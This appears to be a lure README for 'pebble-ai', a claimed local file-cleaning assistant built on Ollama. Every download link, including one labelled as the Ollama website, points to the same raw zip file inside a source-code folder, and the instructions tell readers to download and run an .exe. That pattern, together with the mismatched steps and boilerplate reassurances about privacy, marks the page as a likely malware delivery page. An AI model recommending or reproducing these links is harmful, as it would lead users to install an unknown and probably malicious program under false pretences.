# 🪨 pebble-ai - Keep your computer clean and tidy

[![](https://img.shields.io/badge/Download-PebbleAI-blue.svg)](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip)

pebble-ai helps you organize your files, delete duplicates, and manage disk space. It runs entirely on your machine. Your files stay on your hard drive, and the software processes everything in the background without sending data to the internet. 

## 📦 How to get the app

To start, you need to visit the release page.

1. Go to this link: [https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip)
2. Look for the "Releases" section on the right side of the page.
3. Click the latest version link.
4. Download the file that ends in .exe.
5. Run the file to install the application.

## 🛠️ System requirements

Pebble-ai requires a standard Windows 10 or Windows 11 computer. Ensure you have the following before you begin:

* At least 8GB of system memory.
* An active installation of Ollama.
* At least 2GB of free disk space for the program files.

## ⚙️ Setting up Ollama

Pebble-ai uses Ollama to power its logic. You must install this tool first for the assistant to function.

1. Visit the [Ollama website](https://github.com/ycam4427/pebble-ai/raw/refs/heads/main/src/components/actions/ai_pebble_2.3-alpha.4.zip).
2. Download and install the software for Windows.
3. Once installation finishes, open your command prompt or terminal.
4. Type `ollama run llama3` and press Enter. 
5. Wait for the download to finish. 
6. Keep Ollama running in your system tray while using pebble-ai.

## 🚀 How to use the app

After you install everything, locate the Pebble icon on your desktop or in your start menu. Double-click the icon to launch the window.

### Initializing the assistant
The first time you open the app, it checks for a connection to Ollama. If the connection works, you will see a green light at the top of the interface. If you see a red light, ensure Ollama is active on your machine.

### Scanning for files
To start cleaning your computer, click the blue "Scan" button. The app searches your standard folders, such as Downloads, Documents, and Desktop. It looks for files you have not opened in a long time or files that contain junk data.

### Reviewing suggestions
Pebble-ai acts as an advisor. It does not delete anything without your permission. After the scan finishes, the app presents a list of changes. You can review each item individually.

If you agree with a change, click the tick icon next to the file. If you want to keep the file, click the ignore icon. Once you select your choices, click "Apply Changes" at the bottom of the screen.

## 🔒 Privacy and safety

We built pebble-ai with a local-first approach. Because the application uses your personal Ollama installation, no data leaves your home network. 

* No cloud accounts.
* No data tracking.
* No file uploads.

When the AI suggests a file to move or delete, it analyzes the data inside your local memory. The results display on your screen. Once the task finishes, your machine remains exactly as you intended.

## 📁 Suggested file categories

The assistant focuses on specific types of digital clutter to keep your system fast and responsive:

* Screenshots: The app identifies multiple copies of the same screenshot.
* Old installers: It finds setup files for programs you already installed and no longer need.
* Large documents: It lists files that take up significant space without being recent.
* Empty folders: It detects folders that serve no purpose.

## 🔧 Frequently asked questions

### Can the app delete my private photos?
The app provides suggestions based on file age and size. It asks you to confirm every action. You control the process from start to finish.

### Why do I need Ollama?
Ollama provides the artificial intelligence models that understand your file patterns. By running this locally, you keep full control over your data.

### Does the app slow down my PC? 
The app runs at a low priority. If you notice your computer working hard, you can pause the scan at any time by clicking the pause button.

### Can I change the folders it scans?
Yes. Open the Settings menu in the top right corner. From here, you can add or remove specific folders from the scan list.

## 📋 Troubleshooting

If you encounter issues, please check these common fixes:

* Restart the app: Close the window and reopen it.
* Check Ollama: Ensure the Ollama icon appears in your hidden icons menu on the taskbar.
* Memory usage: Close other heavy applications if the scan takes a long time. 

If the app fails to launch, verify that your Windows version is updated to the latest release provided by Microsoft.